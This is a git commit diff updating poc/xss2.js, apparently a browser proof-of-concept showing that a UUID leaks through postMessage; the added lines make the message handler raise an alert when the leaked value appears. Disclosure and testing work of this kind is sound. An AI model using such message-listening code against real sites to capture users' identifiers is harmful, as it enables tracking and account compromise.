fd0fb40fb1eb1a401dfdecf5f7b9a32c8ce486e2
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2023-05-11 11:24:39 +0200

    Update xss2.js

--- poc/xss2.js
+++ poc/xss2.js
@@ -4,6 +4,9 @@ a.name="mainsite";
 document.body.appendChild(a);
 function messageHandler(e){
   console.log(e);
+  if(e.data.includes("-")){
+    alert("The UUID has leaked in the following postMessage" + e.data);
+  }
 }
 
 function hookMessageHandler(){
